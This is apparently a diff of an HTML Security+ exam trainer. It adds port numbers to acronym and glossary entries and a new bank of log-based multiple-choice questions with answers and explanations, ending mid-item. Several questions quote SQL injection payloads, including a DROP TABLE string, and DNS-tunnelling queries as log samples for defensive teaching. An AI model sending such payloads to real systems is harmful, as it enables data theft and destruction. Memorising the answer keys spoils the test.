@@ -1,3 +1,6 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
 <meta charset="utf-8">
 <meta name="viewport" content="width=device-width, initial-scale=1">
 <title>Night Shift - SY0-701 Operations Trainer</title>
@@ -377,6 +380,8 @@ input[type=date]::-webkit-calendar-picker-indicator:hover{transform:scale(1.08)}
 }
 @media(prefers-reduced-motion:reduce){.neon{animation:none}}
 </style>
+</head>
+<body>
 
 <div class="strip">
   <div class="strip-in">
@@ -4503,7 +4508,7 @@ const ACR = [
 {a:"FPGA",d:"Field Programmable Gate Array",g:"hw"},
 {a:"FRR",d:"False Rejection Rate",g:"auth",u:"How often a biometric system wrongly rejects a legitimate user"},
 {a:"FTP",d:"File Transfer Protocol",g:"proto",u:"Unencrypted file transfer using TCP ports 20 (data) and 21 (control)"},
-{a:"FTPS",d:"Secured File Transfer Protocol",g:"proto",u:"FTP wrapped in TLS"},
+{a:"FTPS",d:"Secured File Transfer Protocol",g:"proto",u:"FTP wrapped in TLS, typically on TCP port 990"},
 {a:"GCM",d:"Galois Counter Mode",g:"crypto",u:"Cipher mode giving both encryption and built-in authentication"},
 {a:"GDPR",d:"General Data Protection Regulation",g:"gov",u:"European privacy regulation defining controller, processor, and subject rights"},
 {a:"GPG",d:"Gnu Privacy Guard",g:"crypto"},
@@ -4520,7 +4525,7 @@ const ACR = [
 {a:"HSM",d:"Hardware Security Module",g:"crypto",u:"Dedicated appliance that generates and protects keys at enterprise scale"},
 {a:"HTML",d:"Hypertext Markup Language",g:"misc"},
 {a:"HTTP",d:"Hypertext Transfer Protocol",g:"proto",u:"Unencrypted web traffic on TCP port 80"},
-{a:"HTTPS",d:"Hypertext Transfer Protocol Secure",g:"proto"},
+{a:"HTTPS",d:"Hypertext Transfer Protocol Secure",g:"proto",u:"Encrypted web traffic on TCP port 443"},
 {a:"HVAC",d:"Heating, Ventilation Air Conditioning",g:"hw"},
 {a:"IaaS",d:"Infrastructure as a Service",g:"cloud",u:"Provider supplies compute, storage, and network; customer owns OS and up"},
 {a:"IaC",d:"Infrastructure as Code",g:"cloud",u:"Defines infrastructure in version-controlled files for repeatable deployment"},
@@ -4532,7 +4537,7 @@ const ACR = [
 {a:"IdP",d:"Identity Provider",g:"access",u:"The system that authenticates users and issues assertions to service providers"},
 {a:"IDS",d:"Intrusion Detection System",g:"ops",u:"Detects and alerts on malicious traffic but does not block it"},
 {a:"IEEE",d:"Institute of Electrical and Electronics Engineers",g:"gov"},
-{a:"IKE",d:"Internet Key Exchange",g:"crypto",u:"Negotiates the security association and keys for IPSec"},
+{a:"IKE",d:"Internet Key Exchange",g:"crypto",u:"Negotiates the security association and keys for IPSec over UDP port 500"},
 {a:"IM",d:"Instant Messaging",g:"misc"},
 {a:"IMAP",d:"Internet Message Access Protocol",g:"mail",u:"Retrieves email while keeping it synced on the server, on TCP port 143"},
 {a:"IoC",d:"Indicators of Compromise",g:"threat",u:"Observable artifacts suggesting a system has been breached"},
@@ -4549,7 +4554,7 @@ const ACR = [
 {a:"IV",d:"Initialization Vector",g:"crypto",u:"Random value ensuring identical plaintext does not produce identical ciphertext"},
 {a:"KDC",d:"Key Distribution Center",g:"auth",u:"Kerberos component that issues tickets"},
 {a:"KEK",d:"Key Encryption Key",g:"crypto",u:"A key used to encrypt other keys"},
-{a:"L2TP",d:"Layer 2 Tunneling Protocol",g:"proto"},
+{a:"L2TP",d:"Layer 2 Tunneling Protocol",g:"proto",u:"Tunneling protocol on UDP port 1701, typically paired with IPSec for encryption"},
 {a:"LAN",d:"Local Area Network",g:"net"},
 {a:"LDAP",d:"Lightweight Directory Access Protocol",g:"access",u:"Queries a directory service for accounts, groups, and attributes, on TCP port 389, or TCP 636 for LDAPS"},
 {a:"LEAP",d:"Lightweight Extensible Authentication Protocol",g:"wifi"},
@@ -4617,14 +4622,14 @@ const ACR = [
 {a:"PIV",d:"Personal Identity Verification",g:"auth"},
 {a:"PKCS",d:"Public Key Cryptography Standards",g:"crypto"},
 {a:"PKI",d:"Public Key Infrastructure",g:"crypto",u:"The whole system of CAs, certificates, and keys that makes asymmetric trust work"},
-{a:"POP",d:"Post Office Protocol",g:"mail"},
+{a:"POP",d:"Post Office Protocol",g:"mail",u:"Downloads mail on TCP port 110, or TCP 995 for encrypted POP3S"},
 {a:"PPP",d:"Point-to-Point Protocol",g:"proto"},
-{a:"PPTP",d:"Point-to-Point Tunneling Protocol",g:"proto"},
+{a:"PPTP",d:"Point-to-Point Tunneling Protocol",g:"proto",u:"Obsolete VPN protocol on TCP port 1723 with broken encryption"},
 {a:"PSK",d:"Pre-shared Key",g:"wifi",u:"A single shared passphrase used by everyone on the network"},
 {a:"PTZ",d:"Pan-tilt-zoom",g:"hw"},
 {a:"PUP",d:"Potentially Unwanted Program",g:"threat"},
 {a:"RA",d:"Recovery Agent / Registration Authority",g:"crypto",u:"Either the trusted role that can recover a lost encryption key, or the party that verifies identity on a CA\u2019s behalf before a certificate is issued."},
-{a:"RADIUS",d:"Remote Authentication Dial-in User Service",g:"auth",u:"Centralized AAA server for network access and wireless authentication"},
+{a:"RADIUS",d:"Remote Authentication Dial-in User Service",g:"auth",u:"Centralized AAA server for network access and wireless authentication, on UDP ports 1812/1813"},
 {a:"RAID",d:"Redundant Array of Inexpensive Disks",g:"risk",u:"Provides fault tolerance against drive failure, not a backup"},
 {a:"RAS",d:"Remote Access Server",g:"net"},
 {a:"RAT",d:"Remote Access Trojan",g:"threat",u:"Malware giving an attacker interactive remote control of a host"},
@@ -4655,7 +4660,7 @@ const ACR = [
 {a:"SED",d:"Self-encrypting Drives",g:"crypto",u:"Storage device performing encryption in hardware"},
 {a:"SEH",d:"Structured Exception Handler",g:"misc"},
 {a:"SE Linux",d:"Security-enhanced Linux",g:"ops",u:"Kernel module enforcing mandatory access control on Linux"},
-{a:"SFTP",d:"Secured File Transfer Protocol",g:"proto",u:"File transfer tunneled over SSH"},
+{a:"SFTP",d:"Secured File Transfer Protocol",g:"proto",u:"File transfer tunneled over SSH on TCP port 22"},
 {a:"SHA",d:"Secure Hashing Algorithm",g:"crypto",u:"Standard family of hash functions used for integrity"},
 {a:"SIEM",d:"Security Information and Event Management",g:"ops",u:"Aggregates and correlates log data from many sources into alerts"},
 {a:"SIM",d:"Subscriber Identity Module",g:"hw"},
@@ -4664,7 +4669,7 @@ const ACR = [
 {a:"SMB",d:"Server Message Block",g:"proto",u:"File and printer sharing protocol on TCP port 445"},
 {a:"SMS",d:"Short Message Service",g:"threat"},
 {a:"SMTP",d:"Simple Mail Transfer Protocol",g:"mail",u:"Sends email, traditionally on TCP port 25, or TCP 587 for secure client submission"},
-{a:"SMTPS",d:"Simple Mail Transfer Protocol Secure",g:"mail"},
+{a:"SMTPS",d:"Simple Mail Transfer Protocol Secure",g:"mail",u:"Encrypted mail submission on TCP port 465"},
 {a:"SNMP",d:"Simple Network Management Protocol",g:"proto",u:"Manages and monitors network devices on UDP port 161, and pushes traps on thresholds over UDP port 162"},
 {a:"SOAP",d:"Simple Object Access Protocol",g:"proto"},
 {a:"SOAR",d:"Security Orchestration, Automation, Response",g:"ops",u:"Automates response playbooks across security tools"},
@@ -4682,7 +4687,7 @@ const ACR = [
 {a:"SSO",d:"Single Sign-on",g:"access",u:"One authentication event grants access to multiple systems"},
 {a:"STIX",d:"Structured Threat Information eXchange",g:"threat",u:"Standard format for describing threat intelligence"},
 {a:"SWG",d:"Secure Web Gateway",g:"ops",u:"Filters and inspects outbound web traffic against policy"},
-{a:"TACACS+",d:"Terminal Access Controller Access Control System",g:"auth",u:"AAA protocol separating authentication, authorization, and accounting, common for device administration"},
+{a:"TACACS+",d:"Terminal Access Controller Access Control System",g:"auth",u:"AAA protocol on TCP port 49, separating authentication, authorization, and accounting, common for device administration"},
 {a:"TAXII",d:"Trusted Automated eXchange of Indicator Information",g:"threat",u:"Transport mechanism for sharing STIX threat intelligence"},
 {a:"TCP/IP",d:"Transmission Control Protocol/Internet Protocol",g:"proto"},
 {a:"TGT",d:"Ticket Granting Ticket",g:"auth",u:"Kerberos credential used to request service tickets"},
@@ -4697,7 +4702,7 @@ const ACR = [
 {a:"UAT",d:"User Acceptance Testing",g:"gov"},
 {a:"UAV",d:"Unmanned Aerial Vehicle",g:"hw"},
 {a:"UBA",d:"User Behavior Analytics",g:"ops",u:"Baselines normal user activity and flags deviations"},
-{a:"UDP",d:"User Datagram Protocol",g:"proto"},
+{a:"UDP",d:"User Datagram Protocol",g:"proto",u:"Connectionless transport with no handshake; commonly seen with DNS on port 53"},
 {a:"UEFI",d:"Unified Extensible Firmware Interface",g:"hw",u:"Modern firmware replacing BIOS, supports Secure Boot"},
 {a:"UEM",d:"Unified Endpoint Management",g:"ops",u:"Single console managing mobile, desktop, and IoT endpoints"},
 {a:"UPS",d:"Uninterruptible Power Supply",g:"hw",u:"Battery bridging short power loss until a generator starts"},
@@ -5399,7 +5404,7 @@ const GLOSS = [
 {term:"IDF",d:3,g:"acronym-hw",def:"Intermediate Distribution Frame. Wiring closet distributing network connectivity to a floor or area. It connects back to the MDF, the primary point where external circuits first enter the building."},
 {term:"IdP (Identity Provider)",d:4,g:"acronym-access",def:"The system that authenticates users and issues assertions to service providers. In an SSO setup, the IdP is the trusted party a user actually authenticates with; other services trust its assertion instead of authenticating the user themselves."},
 {term:"IEEE",d:5,g:"acronym-gov",def:"Institute of Electrical and Electronics Engineers. Standards body behind 802.1X, 802.11 wireless, and related specifications. Nearly every wireless and wired networking standard referenced in this exam traces back to a numbered IEEE specification."},
-{term:"IKE (Internet Key Exchange)",d:1,g:"acronym-crypto",def:"Negotiates the security association and keys for IPSec. It runs before the actual IPSec tunnel carries any traffic, so a failure here means the VPN never comes up at all."},
+{term:"IKE (Internet Key Exchange)",d:1,g:"acronym-crypto",def:"Negotiates the security association and keys for IPSec, over UDP port 500. It runs before the actual IPSec tunnel carries any traffic, so a failure here means the VPN never comes up at all."},
 {term:"IM",d:1,g:"acronym-misc",def:"Instant Messaging. Real-time chat; a message-based threat vector for phishing links and malware delivery. A compromised colleague's chat account can be an even more convincing delivery channel than a spoofed outside email."},
 {term:"IMAP",d:4,g:"acronym-mail",def:"Internet Message Access Protocol, retrieves email while keeping it synced on the server, on TCP port 143, or TCP 993 for the encrypted IMAPS. Unlike POP3, which typically downloads and removes mail from the server, IMAP keeps everything synchronized across multiple devices."},
 {term:"IoT",d:3,g:"acronym-hw",def:"Internet of Things. Networked everyday devices that often ship with weak defaults and no patching path. Default credentials left unchanged are one of the most common ways these devices get recruited into a botnet."},
@@ -5414,7 +5419,7 @@ const GLOSS = [
 {term:"IV (Initialization Vector)",d:1,g:"acronym-crypto",def:"Random value ensuring identical plaintext does not produce identical ciphertext. Reusing an IV with the same key is a serious mistake that can leak information about the plaintext, which is exactly what happened in WEP's design flaw."},
 {term:"KDC (Key Distribution Center)",d:4,g:"acronym-auth",def:"Kerberos component that issues tickets. It has two parts, the Authentication Server that issues the initial TGT and the Ticket Granting Server that issues service tickets, though both usually run on the same physical server."},
 {term:"KEK (Key Encryption Key)",d:1,g:"acronym-crypto",def:"A key used to encrypt other keys. Wrapping a data-encryption key with a KEK means only the KEK holder can unwrap it, adding a layer of protection if the encrypted data itself is exposed."},
-{term:"L2TP",d:4,g:"acronym-proto",def:"Layer 2 Tunneling Protocol. Tunneling protocol with no encryption of its own, typically paired with IPSec. Like GRE, it needs a separate protocol layered on top to actually provide the confidentiality it lacks by itself."},
+{term:"L2TP",d:4,g:"acronym-proto",def:"Layer 2 Tunneling Protocol, running on UDP port 1701. Tunneling protocol with no encryption of its own, typically paired with IPSec. Like GRE, it needs a separate protocol layered on top to actually provide the confidentiality it lacks by itself."},
 {term:"LAN",d:3,g:"acronym-net",def:"Local Area Network. A network confined to a single site or building. Everything from a home network to an entire office floor typically counts as a LAN, contrasted with a WAN that spans much greater distances."},
 {term:"LEAP",d:4,g:"acronym-wifi",def:"Lightweight Extensible Authentication Protocol. Deprecated Cisco wireless authentication protocol with known weaknesses. PEAP was developed as a more secure successor, wrapping authentication inside a protective TLS tunnel LEAP never had."},
 {term:"MaaS",d:3,g:"acronym-cloud",def:"Monitoring as a Service. Outsourced service that watches an organization's systems and alerts on issues. It's a narrower, monitoring-specific slice of the broader outsourcing an MSSP typically provides."},
@@ -5482,12 +5487,12 @@ const GLOSS = [
 {term:"PKI (Public Key Infrastructure)",d:1,g:"acronym-crypto",def:"The whole system of CAs, certificates, and keys that makes asymmetric trust work. Certificate authorities, the certificates they issue, key pairs, and revocation mechanisms all work together to let strangers establish trust without meeting in person."},
 {term:"POP",d:4,g:"acronym-mail",def:"Post Office Protocol. Retrieves mail by downloading it, traditionally removing it from the server. IMAP is the alternative that keeps mail synced on the server instead of removing it after download."},
 {term:"PPP",d:4,g:"acronym-proto",def:"Point-to-Point Protocol. Establishes a direct link between two nodes and can carry authentication. PAP and CHAP are both authentication protocols that were historically carried over a PPP link."},
-{term:"PPTP",d:4,g:"acronym-proto",def:"Point-to-Point Tunneling Protocol. Obsolete VPN tunneling protocol with broken encryption. It's been almost entirely replaced by more secure options like IPSec-based VPNs and modern SSL VPN implementations."},
+{term:"PPTP",d:4,g:"acronym-proto",def:"Point-to-Point Tunneling Protocol, using TCP port 1723. Obsolete VPN tunneling protocol with broken encryption. It's been almost entirely replaced by more secure options like IPSec-based VPNs and modern SSL VPN implementations."},
 {term:"PSK (Pre-shared Key)",d:4,g:"acronym-wifi",def:"A single shared passphrase used by everyone on the network. It's simpler to deploy than 802.1X since there's no authentication server needed, but revoking access for one person usually means changing it for everyone."},
 {term:"PTZ",d:3,g:"acronym-hw",def:"Pan-tilt-zoom. Camera that can be remotely aimed and zoomed to follow activity. Its remote maneuverability makes a single PTZ camera capable of covering an area that would otherwise need several fixed cameras."},
 {term:"PUP",d:2,g:"acronym-threat",def:"Potentially Unwanted Program. Software bundled with an install that the user did not actually want. Bloatware is a closely related concept, though a PUP is more often actively unwanted rather than just manufacturer-preinstalled."},
 {term:"RA (Recovery Agent / Registration Authority)",d:1,g:"acronym-crypto",def:"Either the trusted role that can recover a lost encryption key, or the party that verifies identity on a CA's behalf before a certificate is issued. Two unrelated meanings sharing one abbreviation, context tells you which."},
-{term:"RADIUS (Remote Authentication Dial-in User Service)",d:4,g:"acronym-auth",def:"Centralized AAA server for network access and wireless authentication. It's commonly the backend authentication server behind 802.1X port-based network access control, making the final accept or reject decision."},
+{term:"RADIUS (Remote Authentication Dial-in User Service)",d:4,g:"acronym-auth",def:"Centralized AAA server for network access and wireless authentication, using UDP ports 1812 (authentication) and 1813 (accounting). It's commonly the backend authentication server behind 802.1X port-based network access control, making the final accept or reject decision."},
 {term:"RAID (Redundant Array of Inexpensive Disks)",d:5,g:"acronym-risk",def:"Provides fault tolerance against drive failure, not a backup. Different RAID levels trade off performance and capacity, but none of them protect against accidental deletion or ransomware the way an actual backup does."},
 {term:"RAS",d:3,g:"acronym-net",def:"Remote Access Server. Server providing remote users access into the internal network. It's largely been supplanted by VPN technology, though the underlying concept, letting authorized users reach internal resources remotely, remains the same."},
 {term:"RAT (Remote Access Trojan)",d:2,g:"acronym-threat",def:"Malware giving an attacker interactive remote control of a host. Because it grants hands-on control rather than just data theft, a RAT infection is often used as a foothold for deeper compromise, including privilege escalation."},
@@ -5557,7 +5562,7 @@ const GLOSS = [
 {term:"SSL (Secure Sockets Layer)",d:1,g:"acronym-crypto",def:"Deprecated predecessor to TLS. Every version of SSL has known vulnerabilities, which is why modern systems should be configured to use TLS exclusively, even though people still say \\\"SSL\\\" out of habit."},
 {term:"STIX (Structured Threat Information eXchange)",d:2,g:"acronym-threat",def:"Standard format for describing threat intelligence. It provides a common language for describing indicators, threat actors, and attack patterns, which is what lets AIS and TAXII exchange that information at machine speed."},
 {term:"SWG (Secure Web Gateway)",d:4,g:"acronym-ops",def:"Filters and inspects outbound web traffic against policy. It's the outbound counterpart to a firewall's traffic controls, specifically focused on web content: blocking malicious sites, enforcing acceptable-use policy, and inspecting HTTPS traffic for hidden threats."},
-{term:"TACACS+ (Terminal Access Controller Access Control System)",d:4,g:"acronym-auth",def:"AAA protocol separating authentication, authorization, and accounting, common for device administration. Unlike RADIUS, which combines authentication and authorization into one step, TACACS+ keeps all three functions distinctly separate."},
+{term:"TACACS+ (Terminal Access Controller Access Control System)",d:4,g:"acronym-auth",def:"AAA protocol on TCP port 49, separating authentication, authorization, and accounting, common for device administration. Unlike RADIUS, which combines authentication and authorization into one step, TACACS+ keeps all three functions distinctly separate."},
 {term:"TAXII (Trusted Automated eXchange of Indicator Information)",d:2,g:"acronym-threat",def:"Transport mechanism for sharing STIX threat intelligence. Think of STIX as the language and TAXII as the delivery truck: STIX defines what the threat data looks like, TAXII defines how it gets from one organization to another."},
 {term:"TCP/IP",d:4,g:"acronym-proto",def:"Transmission Control Protocol/Internet Protocol. The protocol suite underlying nearly all modern network communication. TCP handles reliable, ordered delivery while IP handles addressing and routing, the two working together as the suite's core."},
 {term:"TGT (Ticket Granting Ticket)",d:4,g:"acronym-auth",def:"Kerberos credential used to request service tickets. A user only has to authenticate once to get a TGT, then uses it to request individual service tickets without re-entering credentials, the convenience at the heart of Kerberos SSO."},
@@ -5568,7 +5573,7 @@ const GLOSS = [
 {term:"TSIG",d:4,g:"acronym-proto",def:"Transaction Signature. Authenticates DNS zone transfers between servers using a shared key. It's a specific mechanism for securing the server-to-server transfer of DNS zone data, distinct from DNSSEC's broader response authentication."},
 {term:"UAT",d:5,g:"acronym-gov",def:"User Acceptance Testing. Testing stage where end users confirm the system meets requirements before release. It typically comes after technical testing and is one of the test results that would inform a change's approval decision."},
 {term:"UAV",d:3,g:"acronym-hw",def:"Unmanned Aerial Vehicle. Drone, usable for physical reconnaissance and for reaching restricted areas. A drone can capture footage of a facility's badge readers or camera placement without ever setting foot on the property."},
-{term:"UDP",d:4,g:"acronym-proto",def:"User Datagram Protocol. Connectionless transport with no handshake, easily spoofed for amplification attacks. Its lack of a handshake is what makes source-address spoofing trivial, exactly the mechanism a reflected DDoS attack relies on."},
+{term:"UDP",d:4,g:"acronym-proto",def:"User Datagram Protocol. Connectionless transport with no handshake, easily spoofed for amplification attacks, and used by protocols like DNS on port 53. Its lack of a handshake is what makes source-address spoofing trivial, exactly the mechanism a reflected DDoS attack relies on."},
 {term:"UEFI (Unified Extensible Firmware Interface)",d:3,g:"acronym-hw",def:"Modern firmware replacing BIOS, supports Secure Boot. Its Secure Boot feature can verify that only trusted, digitally signed code runs during startup, blocking bootkits that BIOS-based systems were vulnerable to."},
 {term:"UEM (Unified Endpoint Management)",d:4,g:"acronym-ops",def:"Single console managing mobile, desktop, and IoT endpoints. It's the evolution of MDM, extending centralized management beyond just phones and tablets to cover laptops, desktops, and IoT devices from one console."},
 {term:"UPS (Uninterruptible Power Supply)",d:3,g:"acronym-hw",def:"Battery bridging short power loss until a generator starts. It's meant to bridge a brief outage or give equipment time to shut down gracefully, not to run indefinitely, that's what a generator is for."},
@@ -5811,7 +5816,7 @@ const EXTRA_U = {
 "ISO":"International body publishing management system standards such as the 27000 series",
 "ISP":"The provider supplying an organization's internet connectivity",
 "ISSO":"Role accountable for the security posture of a specific information system",
-"L2TP":"Tunneling protocol with no encryption of its own, typically paired with IPSec",
+"L2TP":"Tunneling protocol on UDP port 1701 with no encryption of its own, typically paired with IPSec",
 "LAN":"A network confined to a single site or building",
 "LEAP":"Deprecated Cisco wireless authentication protocol with known weaknesses",
 "MAN":"A network spanning a city or metropolitan area",
@@ -5840,9 +5845,9 @@ const EXTRA_U = {
 "PGP":"Encrypts and signs email and files using a web-of-trust model",
 "PIV":"Government-issued smart card serving as a something-you-have factor",
 "PKCS":"Family of standards defining certificate and key file formats",
-"POP":"Retrieves mail by downloading it, traditionally removing it from the server",
+"POP":"Retrieves mail by downloading it on port 110, traditionally removing it from the server",
 "PPP":"Establishes a direct link between two nodes and can carry authentication",
-"PPTP":"Obsolete VPN tunneling protocol with broken encryption",
+"PPTP":"Obsolete VPN tunneling protocol on TCP port 1723 with broken encryption",
 "PTZ":"Camera that can be remotely aimed and zoomed to follow activity",
 "PUP":"Software bundled with an install that the user did not actually want",
 "RAS":"Server providing remote users access into the internal network",
@@ -5855,7 +5860,7 @@ const EXTRA_U = {
 "SMB":"Windows file and printer sharing protocol, heavily targeted by worms",
 "SMS":"Text messaging, the delivery channel for smishing and a weak second factor",
 "SMTP":"Sends mail between servers on port 25",
-"SMTPS":"Sends mail over an encrypted TLS connection",
+"SMTPS":"Sends mail over an encrypted TLS connection on port 465",
 "SOAP":"XML-based protocol for exchanging structured data between web services",
 "SoC":"Single chip integrating processor, memory, and peripherals, common in embedded devices",
 "SOC":"The team and facility that monitors and responds to security events around the clock",
@@ -5866,7 +5871,7 @@ const EXTRA_U = {
 "TSIG":"Authenticates DNS zone transfers between servers using a shared key",
 "UAT":"Testing stage where end users confirm the system meets requirements before release",
 "UAV":"Drone, usable for physical reconnaissance and for reaching restricted areas",
-"UDP":"Connectionless transport with no handshake, easily spoofed for amplification attacks",
+"UDP":"Connectionless transport with no handshake, easily spoofed for amplification attacks; used by DNS on port 53",
 "UTP":"Standard network cabling with no shielding against electromagnetic interference",
 "VM":"Virtualized computer instance running on a hypervisor",
 "VoIP":"Carries telephone calls over the data network",
@@ -7951,7 +7956,722 @@ e:"A regulatory examination is conducted by a government body with legal authori
 w:["An internal audit is performed by an organization's own staff, not an external government body with enforcement authority.","A self-assessment is completed internally without external verification, unlike this government-led examination.","","A penetration test involves actively attempting to exploit systems, which is a different activity than a regulatory compliance examination."]}
 ];
 
-const QUESTIONS=Q1.concat(Q2).concat(Q3).concat(Q4).concat(Q5).concat(Q6).concat(Q7).concat(Q8).concat(Q9).concat(Q10).concat(Q11).concat(Q12).concat(Q13).concat(Q14).concat(Q15);
+const Q16 = [
+{i:2333,d:4,o:"4.9",t:"s",g:"ips-log-analysis",
+pre:"MAIN-IPS: 03Aug2026 14:12:07 alert 10.4.22.19\nAlert: HTTP SQL Injection Attempt Detected; Host: WebApp01\nSeverity: high; Action: dropped\nProto: tcp; dst: 172.16.5.10:443; src: 10.4.22.19\nRequest: GET /products.php?id=1' OR '1'='1",
+q:"A security analyst reviews this IPS log entry. Which of the following BEST describes what happened?",
+c:["The web application successfully processed a valid customer query","The IPS logged the event but allowed the request through","The IPS blocked a SQL injection attempt aimed at the web application","The source host 172.16.5.10 launched the attack"],a:2,
+e:"The alert name, the classic ' OR '1'='1 payload, and \"Action: dropped\" together confirm the IPS identified and blocked a SQL injection attempt against the web server.",
+w:["A payload containing OR '1'='1 is a textbook SQL injection tautology, not a legitimate product lookup.","\"Action: dropped\" explicitly states the packet was blocked, not passed through.","","The src field, not dst, identifies the attacker. 10.4.22.19 is the source; 172.16.5.10 is the destination web server being attacked."]},
+
+{i:2334,d:2,o:"2.4",t:"s",g:"sql-injection-vuln",
+pre:"GET /account.php?user=1;DROP TABLE users;-- HTTP/1.1\nHost: shop.example.com",
+q:"Which type of vulnerability is being exploited by this request?",
+c:["SQL injection","Cross-site scripting","Directory traversal","Buffer overflow"],a:0,
+e:"A semicolon followed by a DROP TABLE statement and a SQL comment marker (--) is a classic SQL injection payload attempting to terminate the intended query and execute a destructive command.",
+w:["","Cross-site scripting injects HTML or JavaScript designed to run in a victim's browser; this payload targets the database with SQL syntax instead.","Directory traversal uses sequences like ../../ to escape the intended file path; nothing here references the file system.","Buffer overflow exploits typically involve oversized or malformed input designed to overwrite memory, not SQL command syntax like DROP TABLE."]},
+
+{i:2335,d:4,o:"4.9",t:"s",g:"dns-tunneling-log",
+pre:"12:01:03 query: a8f3e91b2c.malicious-c2.net A\n12:01:04 query: 7d2b0e44f1.malicious-c2.net A\n12:01:04 query: 91cc3a02de.malicious-c2.net A\n12:01:05 query: 4b7f1a90ee.malicious-c2.net A\n(pattern repeats hundreds of times per hour from a single workstation)",
+q:"A workstation is generating this pattern of DNS queries. Which technique is MOST likely occurring?",
+c:["A misconfigured DHCP relay","Legitimate CDN load balancing","ARP cache poisoning","DNS tunneling"],a:3,
+e:"A high volume of queries to random-looking subdomains under one domain is the hallmark of DNS tunneling, where data is encoded into DNS requests to exfiltrate data or maintain a covert command-and-control channel.",
+w:["DHCP relay issues affect IP address assignment, not DNS query patterns to a single suspicious domain.","CDNs use predictable, cacheable hostnames tied to content, not random alphanumeric strings queried hundreds of times an hour.","ARP poisoning happens at Layer 2 within a local subnet and has nothing to do with DNS query logs.",""]},
+
+{i:2336,d:4,o:"4.9",t:"s",g:"file-integrity",
+pre:"14:02:11 - Baseline mismatch: C:\\Windows\\System32\\drivers\\etc\\hosts\n14:02:11 - Baseline mismatch: C:\\Windows\\System32\\svchost.exe\n14:02:12 - Baseline mismatch: C:\\Windows\\System32\\drivers\\tcpip.sys\n14:02:12 - 3 unauthorized modifications detected",
+q:"Which tool MOST likely generated this output?",
+c:["A vulnerability scanner","A file integrity monitoring (FIM) tool","A network-based IDS","A data loss prevention (DLP) system"],a:1,
+e:"File integrity monitoring tools maintain a cryptographic baseline of critical system files and alert when the current state no longer matches, exactly what \"Baseline mismatch\" indicates here.",
+w:["A vulnerability scanner reports known weaknesses and missing patches, not file-by-file baseline comparisons.","","A network-based IDS inspects traffic on the wire; it has no visibility into local file hashes.","DLP focuses on data leaving the organization through channels like email or USB, not local file modification detection."]},
+
+{i:2337,d:2,o:"2.4",t:"s",g:"rootkit",
+pre:"C:\\> tasklist\n(no suspicious processes listed)\nC:\\> netstat -ano\nTCP 10.0.5.22:445 203.0.113.44:51322 ESTABLISHED PID 4\n(PID 4 = System; connection not visible in Task Manager GUI)",
+q:"An analyst notices a network connection tied to a system process that is invisible in the Task Manager GUI but appears in a raw netstat query. Which malware type is MOST consistent with this behavior?",
+c:["Keylogger","Logic bomb","Rootkit","Adware"],a:2,
+e:"Rootkits specifically hook the operating system's APIs to hide processes, files, or connections from standard user-mode tools like Task Manager, while lower-level utilities can still reveal the activity.",
+w:["A keylogger captures keystrokes; it does not typically hide network connections from GUI tools while remaining visible to netstat.","A logic bomb lies dormant until a trigger condition and then executes a payload; it isn't defined by hiding active network connections.","","Adware displays unwanted advertisements and rarely goes to the effort of cloaking itself from the OS at the kernel level."]},
+
+{i:2338,d:4,o:"4.4",t:"s",g:"firewall-logs",
+pre:"Jul 22 03:14:02 fw01 kernel: DROP IN=eth0 OUT= SRC=198.51.100.7 DST=10.0.0.15 PROTO=TCP SPT=41220 DPT=3389\nJul 22 03:14:03 fw01 kernel: DROP IN=eth0 OUT= SRC=198.51.100.7 DST=10.0.0.16 PROTO=TCP SPT=41221 DPT=3389\nJul 22 03:14:03 fw01 kernel: DROP IN=eth0 OUT= SRC=198.51.100.7 DST=10.0.0.17 PROTO=TCP SPT=41222 DPT=3389\n(pattern continues across the entire /24 in sequential order)",
+q:"Which activity do these firewall log entries MOST likely represent?",
+c:["A network port scan targeting RDP across a subnet","Normal RDP traffic from a remote administrator","A successful brute-force login to a Windows server","A DNS amplification attack"],a:0,
+e:"Sequential destination addresses across a subnet, all probing the same destination port (3389, RDP), and all dropped, is the signature of an automated port scan sweeping for exposed RDP services.",
+w:["","Legitimate RDP traffic from an administrator would target a single known host, not sweep sequentially through an entire subnet, and would typically be allowed rather than dropped.","Every entry shows DROP, meaning the connection never completed, so no login attempt (successful or not) actually occurred.","DNS amplification involves spoofed UDP DNS queries reflected off open resolvers, not sequential TCP connection attempts to port 3389."]},
+
+{i:2339,d:4,o:"4.1",t:"s",g:"wireless-security",
+pre:"SSID: CorpGuest / Wireless Mode: 802.11ac / Security Mode: Open (no authentication)\nFrequency band: 5 GHz / Channel: 149 / DHCPv4 Server: Enabled\nIP address: 192.168.50.1 / Subnet mask: 255.255.255.0",
+q:"A guest wireless network is configured as shown. Which change would BEST improve its security without disrupting ease of guest access?",
+c:["Change the wireless mode from 802.11ac to 802.11n","Move the network to the 2.4 GHz frequency band","Disable the DHCPv4 server","Switch the security mode to WPA2 or WPA3 with a shared passphrase"],a:3,
+e:"An open network transmits all traffic unencrypted and allows any nearby device to associate. Moving to WPA2/WPA3 with a shared passphrase adds encryption and a basic barrier to entry while still keeping onboarding simple for guests.",
+w:["Wireless mode (802.11ac vs 802.11n) governs speed and range, not authentication or encryption strength.","Frequency band choice affects range and interference, not security.","Disabling DHCP would break automatic IP assignment for guests and provides no real security benefit against a determined attacker on the same open SSID.",""]},
+
+{i:2340,d:4,o:"4.9",t:"s",g:"os-authentication-logs",
+pre:"09:41:02 Failed password for admin from 203.0.113.9 port 51122\n09:41:03 Failed password for admin from 203.0.113.9 port 51124\n09:41:03 Failed password for admin from 203.0.113.9 port 51126\n... (247 more failed attempts within 90 seconds)\n09:42:35 Accepted password for admin from 203.0.113.9 port 51410",
+q:"Which attack technique is MOST clearly demonstrated by this authentication log?",
+c:["Credential stuffing","Brute-force attack","Pass-the-hash","Session hijacking"],a:1,
+e:"Hundreds of rapid failed login attempts against the same account from the same source, followed by an eventual success, is the classic signature of a brute-force attack systematically guessing passwords.",
+w:["Credential stuffing replays previously breached username/password pairs across many different accounts or sites; this log shows repeated guesses against a single account, not reuse of stolen credential pairs across targets.","","Pass-the-hash reuses a captured password hash to authenticate without ever submitting a plaintext password, so it wouldn't generate a long string of failed password attempts.","Session hijacking takes over an already-authenticated session; it does not involve repeated login failures beforehand."]},
+
+{i:2341,d:2,o:"2.4",t:"s",g:"arp-onpath",
